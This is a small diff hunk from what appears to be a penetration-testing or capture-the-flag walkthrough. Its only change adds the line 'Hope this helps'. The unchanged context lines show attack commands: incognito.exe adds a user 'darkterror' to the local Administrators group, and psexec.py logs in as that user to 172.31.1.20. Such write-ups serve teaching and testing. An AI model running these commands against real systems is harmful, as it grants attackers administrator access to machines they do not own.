@@ -41,3 +41,4 @@ incognito.exe add_localgroup_user Administrators darkterror
 ```zsh
 python psexec.py 'darkterror'@172.31.1.20
 ```
+Hope this helps
